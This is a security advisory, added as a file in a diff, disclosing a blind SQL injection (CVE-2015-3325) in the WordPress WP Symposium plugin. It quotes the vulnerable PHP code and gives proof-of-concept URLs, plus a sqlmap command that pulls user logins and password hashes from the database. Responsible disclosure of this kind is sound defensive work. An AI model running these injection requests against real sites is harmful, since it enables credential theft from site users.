@@ -1,0 +1,112 @@
+=======================================================================
+
+              title: SQL Injection
+            product: WordPress WP Symposium Plugin
+ vulnerable version: 15.1 (and probably below)
+      fixed version: 15.4
+         CVE number: CVE-2015-3325
+             impact: CVSS Base Score 7.5 (AV:N/AC:L/Au:N/C:P/I:P/A:P)
+           homepage: https://wordpress.org/plugins/wp-symposium/
+              found: 2015-02-07
+                 by: Hannes Trunde
+                     
+               mail: hannes.trunde@gmail.com
+            twitter: @hannestrunde
+
+=======================================================================
+
+
+Plugin description:
+-------------------
+"WP Symposium turns a WordPress website into a Social Network! It is a WordPress
+plugin that provides a forum, activity (similar to Facebook wall), member 
+directory, private mail, notification panel, chat windows, profile page, social 
+widgets, activity alerts, RSS activity feeds, Groups, Events, Gallery, Facebook 
+Connect and Mobile support! You simply choose which you want to activate! 
+Certain features are optional to members to protect their privacy."
+
+Source: https://wordpress.org/plugins/wp-symposium/
+
+
+Recommendation:
+---------------
+The author has provided a fixed plugin version which should be installed 
+immediately.
+
+
+Vulnerability overview/description:
+-----------------------------------
+Because of insufficient input validation, a blind sql injection attack can be
+performed within the forum feature to obtain sensitive information from the 
+database. The vulnerable code sections are described below.
+
+forum.php lines 59-62:
+===============================================================================
+if ( ( $topic_id == '' && $cat_id == '') || ( !$cat_id != '' && get_option(WPS_OPTIONS_PREFIX.'_forum_ajax') && !get_option(WPS_OPTIONS_PREFIX.'_permalink_structure') ) ) {
+   $cat_id = isset($_GET['cid']) ? $_GET['cid'] : 0;
+   $topic_id = isset($_GET['show']) ? $_GET['show'] : 0;  // GET PARAMETER IS ASSIGNED TO $topic_id VARIABLE
+}
+===============================================================================
+
+forum.php lines 95-103:
+===============================================================================
+if ( get_option(WPS_OPTIONS_PREFIX.'_permalink_structure') || !get_option(WPS_OPTIONS_PREFIX.'_forum_ajax') ) {
+   if ($topic_id == 0) {
+      $forum = __wps__getForum($cat_id);
+      if (($x = strpos($forum, '[|]')) !== FALSE) $forum = substr($forum, $x+3);
+      $html .= $forum;
+   } else {
+      $html .= __wps__getTopic($topic_id);	// __wps__getTopic IS CALLED WITH $topic_id AS PARAMETER
+   }
+}
+===============================================================================
+
+functions.php lines 152-155:
+===============================================================================
+$post = $wpdb->get_row("
+   SELECT tid, topic_subject, topic_approved, topic_category, topic_post, topic_started, display_name, topic_sticky, topic_owner, for_info 
+   FROM ".$wpdb->prefix."symposium_topics t INNER JOIN ".$wpdb->base_prefix."users u ON t.topic_owner = u.ID 
+   WHERE (t.topic_approved = 'on' OR t.topic_owner = ".$current_user->ID.") AND tid = ".$topic_id);   //UNVALIDATED $topic_id IS USED IN SQL QUERY
+===============================================================================
+
+
+Proof of concept:
+-----------------
+The following HTTP request to the forum page returns the topic with id 1:
+===============================================================================
+http://www.site.com/?page_id=4&cid=1&show=1 AND 1=1
+===============================================================================
+
+The following HTTP request to the forum page returns a blank page, thus 
+confirming the blind SQL injection vulnerability:
+===============================================================================
+http://www.site.com/?page_id=4&cid=1&show=1 AND 1=0
+===============================================================================
+
+Obtaining users and password hashes with sqlmap may look as follows:
+================================================================================
+sqlmap -u "http://www.site.com/?page_id=4&cid=1&show=1" -p "show" --technique=B --dbms=mysql --sql-query="select user_login,user_pass from wp_users"
+================================================================================
+
+
+Contact timeline:
+------------------------
+2015-04-08: Contacting author via mail.
+2015-04-13: Mail from author, confirming the vulnerability.
+2015-04-14: Requesting CVE via post to the open source software security mailing 
+            list: http://openwall.com/lists/oss-security/2015/04/14/5
+2015-04-15: Mail from author, stating that updated plugin version will be 
+            available in the next few days.
+2015-05-05: Mail from author, stating that fixed version has been uploaded and
+            should be available soon.
+2015-05-07: Confirming that update is available, releasing security advisory
+            
+
+Solution:
+---------
+Update to the most recent plugin version.
+
+
+Workaround:
+-----------
+See solution.
